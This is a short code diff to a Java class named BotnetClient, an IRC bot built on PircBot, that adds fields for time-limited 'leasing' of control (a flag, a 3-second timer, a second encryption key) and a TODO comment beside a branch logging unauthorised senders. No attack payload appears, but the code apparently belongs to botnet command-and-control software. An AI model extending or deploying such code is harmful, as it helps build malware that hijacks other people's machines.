@@ -36,6 +36,11 @@ public class BotnetClient extends PircBot {
 	
 	private MsgEncrypt m;
 	
+	private boolean leased = false;
+	private final int TIME = 3000; // Time in milliseconds
+	private long startTime;
+	private MsgEncrypt leasedM; // This will be set to null when time is up
+	
 	public static void main(String[] args) {
 		BotnetClient bn = new BotnetClient();
 	}
@@ -150,7 +155,7 @@ public class BotnetClient extends PircBot {
 				e.printStackTrace();
 				System.out.println("There was problems decrypting the message");
 			}
-		} else {
+		} else { // TODO: use leasing here??
 			System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
 		}
 	}
